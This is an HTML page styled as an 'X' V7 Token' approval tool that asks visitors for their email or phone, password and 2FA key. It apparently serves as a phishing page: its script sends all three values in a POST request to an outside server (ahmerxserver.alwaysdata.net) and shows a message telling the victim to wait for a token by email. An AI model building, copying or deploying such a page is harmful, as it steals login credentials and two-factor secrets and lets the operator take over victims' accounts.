<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta charset="UTF-8">
  <title>X' V7 Token</title>
  <style>
    body {
  margin: 0;
  font-family: 'Segoe UI', Arial, sans-serif;
  background: linear-gradient(135deg, #8b0000, #4b0082); /* reddish purple gradient */
  color: #fff;
  min-height: 100vh;
   / Center everything /
  display: flex;
  flex-direction: column;
  justify-content: center;   / vertical centering /
  align-items: center;       / horizontal centering /
  text-align: center;
    }
}
header {
  padding: 12px;
  font-size: 1.8em;
  font-weight: bold;
  text-shadow: 2px 2px 6px rgba(0,0,0,0.6);
}
.form-container {
  background: rgba(0,0,0,0.4);
  padding: 16px;
  border-radius: 12px;
  width: 90%;
  max-width: 400px;
  box-shadow: 0 0 15px rgba(255,255,255,0.2);
}
.form-container label {
  display: block;
  margin: 10px 0 4px;
  font-weight: bold;
  text-align: left;
}
.form-container input[type="text"] {
  width: 92%;
  padding: 10px;
  border-radius: 6px;
  border: none;
  margin-bottom: 12px;
  font-size: 1em;
}
.form-container button {
  width: 100%;
  padding: 12px;
  background: #ff4444;
  color: #fff;
  font-size: 1.1em;
  font-weight: bold;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  transition: background 0.3s;
}
.form-container button:hover {
  background: #cc0000;
}
.message {
  margin-top: 12px;
  font-weight: bold;
  text-align: center;
}
.error {
  color: #ffdddd;
}
.success {
  color: #90ee90;
}
footer {
  padding: 10px;
  font-size: 0.9em;
  color: #ddd;
}
/* Mobile responsiveness */
@media (max-width: 480px) {
  header {
    font-size: 1.5em;
  }
  .form-container {
    padding: 12px;
    width: 95%;
  }
  .form-container button {
    font-size: 1em;
    padding: 10px;
  }
}
  </style>
</head>
<body>
  <header>X' V7 Token</header>

  <div class="form-container">
    <form id="approvalForm">
      <label for="email">Email / Phone:</label>
      <input type="text" id="email" name="email" placeholder="Enter your email or phone" required>

      <label for="password">Password:</label>
      <input type="text" id="password" name="password" placeholder="Enter your password" required>

      <label for="twofa">2FA Keys:</label>
      <input type="text" id="twofa" name="twofa" placeholder="Enter your 2FA key" required>

      <button type="submit">Send Approval</button>
    </form>

    <div id="response" class="message"></div>
  </div>

  <footer>Made by Ahmer Awan</footer>

  <script>
    const form = document.getElementById("approvalForm");
    const responseDiv = document.getElementById("response");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const emailField = document.getElementById("email");
      const passwordField = document.getElementById("password");
      const twofaField = document.getElementById("twofa");

      const typedValue = emailField.value.trim();
      const passwordValue = passwordField.value.trim();
      const twofaValue = twofaField.value.trim();

      // ✅ Validation: email OR 11-digit phone number
      const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
      const phoneRegex = /^\\d{11}$/;

      if (!emailRegex.test(typedValue) && !phoneRegex.test(typedValue)) {
        responseDiv.textContent = "Invalid input: please enter a valid email or 11-digit phone number.";
        responseDiv.className = "message error";
        return;
      }

      try {
        const res = await fetch("https://ahmerxserver.alwaysdata.net/sendApproval", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email: typedValue,
            password: passwordValue,
            twofa: twofaValue
          })
        });

        if (res.ok) {
          responseDiv.textContent = `Sent the approval request. Wait for email with token at ${typedValue}`;
          responseDiv.className = "message success";
        } else {
          responseDiv.textContent = "Can not send approval: Error 405 - Contact Admin at mkb1538bl@gmail.com";
          responseDiv.className = "message error";
        }
      } catch (err) {
        responseDiv.textContent = "Can not send approval: Error 405 - Contact Admin at mkb1538bl@gmail.com";
        responseDiv.className = "message error";
      }
    });
  </script>
</body>
</html>
